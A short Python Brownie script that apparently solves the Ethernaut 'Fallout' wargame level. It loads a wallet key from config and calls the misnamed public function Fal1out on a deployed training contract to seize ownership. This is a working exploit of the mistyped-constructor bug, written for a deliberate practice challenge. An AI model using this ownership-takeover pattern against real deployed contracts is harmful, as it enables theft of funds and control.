from brownie import Fallout, accounts, config, network

def main():
    InstanceAddress = "0xEE5335E55b0eaA2E1f485A766A0a989d4c99834E"

    player = accounts.add(config["wallets"]["from_key"]) 

    foContract = Fallout.at(InstanceAddress)
    foContract.Fal1out({"from": player}) #call the constructor with the type name
